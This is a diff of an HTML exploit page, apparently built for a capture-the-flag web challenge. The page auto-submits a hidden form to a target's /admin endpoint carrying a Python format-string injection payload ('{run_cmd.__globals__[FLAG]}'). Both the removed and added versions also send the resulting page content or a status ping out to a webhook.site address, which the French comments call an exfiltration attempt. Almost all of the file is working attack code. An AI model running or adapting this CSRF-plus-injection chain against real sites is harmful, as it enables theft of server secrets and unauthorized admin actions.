@@ -1,30 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head><title>XSS POC</title></head>
-<body>
-<h1>Loading...</h1>
+<head>
+  <title>XSS Exploitation</title>
+</head>
+<body onload="document.getElementById('exploitForm').submit();">
+  <h1>Redirection...</h1>
+  
+  <form id="exploitForm" action="https://saymyname-6d87ed9baea34c35.deploy.phreaks.fr/admin" method="GET">
+    <input type="hidden" name="prompt" value="{run_cmd.__globals__[&quot;FLAG&quot;]}">
+    <input type="submit" value="Submit">
+  </form>
 
-<!-- Auto-submit form targeting the admin endpoint -->
-<iframe style="width:0;height:0;border:0;border:none;" name="csrf-frame"></iframe>
-<form id="csrf-form" action="https://saymyname-6d87ed9baea34c35.deploy.phreaks.fr/admin" method="GET" target="csrf-frame">
-  <input type="hidden" name="prompt" value="{run_cmd.__globals__}">
-</form>
-
-<script>
-// Auto-submit the form
-window.onload = function() {
-  document.getElementById("csrf-form").submit();
-  // Wait a bit then check the result from iframe
-  setTimeout(function() {
-    // Try to fetch the content of the iframe
-    try {
-      var frameContent = document.getElementsByName('csrf-frame')[0].contentDocument.body.innerHTML;
-      fetch("https://webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?result=" + encodeURIComponent(frameContent));
-    } catch(e) {
-      fetch("https://webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?error=" + encodeURIComponent(e.toString()));
-    }
-  }, 2000);
-}
-</script>
+  <script>
+    // Ajouter un écouteur pour envoyer les informations de la page après redirection
+    window.addEventListener('load', function() {
+      // Déjà soumis par onload
+      setTimeout(function() {
+        // Tentative d'exfiltration de données
+        fetch('https://webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?loaded=true');
+      }, 1000);
+    });
+  </script>
 </body>
 </html>
